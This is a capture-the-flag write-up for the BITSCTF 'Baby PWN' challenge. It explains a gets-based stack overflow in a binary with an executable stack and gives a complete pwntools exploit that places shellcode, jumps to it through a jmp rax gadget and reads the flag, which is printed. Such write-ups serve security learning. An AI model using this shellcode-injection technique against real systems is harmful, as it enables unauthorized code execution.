https://ctftime.org/event/2607

# Baby PWN (pwn)

I hope you are having a nice day.

nc chals.bitskrieg.in 6001

## Analysis

```bash
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX unknown - GNU_STACK missing
PIE:      No PIE (0x400000)
Stack:    Executable
RWX:      Has RWX segments
```

`vuln` @ `0x401136`:
  - Calls `gets` with a buffer that is offset 0x78 bytes from the return address
  - Note that after a call to `gets` the `rax` register contains a pointer to the buffer that was passed to `gets`

## Solution

1) Write shellcode to the executable stack
2) Stomp the return address with a `jmp rax` gadget so that we pivot to the shellcode we just wrote to the stack
3) Read the flag with `/bin/cat`

```python
#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"
elf = ELF("./main", checksec=False)
context.binary = elf

#p = elf.process()
#p = elf.debug(gdbscript="")
p = remote("chals.bitskrieg.in", 6001)

JMP_RAX = 0x4010ac # : jmp rax

payload = asm(shellcraft.sh()).ljust(0x78, b"A")
payload += p64(JMP_RAX)
p.sendline(payload)

p.sendline(b"/bin/cat flag.txt")

# BITSCTF{w3lc0m3_70_7h3_w0rld_0f_b1n4ry_3xpl01t4t10n_ec5d9205}
print(p.readuntil(b"}").decode())
```

## Flag
`BITSCTF{w3lc0m3_70_7h3_w0rld_0f_b1n4ry_3xpl01t4t10n_ec5d9205}`

smiley 2025/02/07
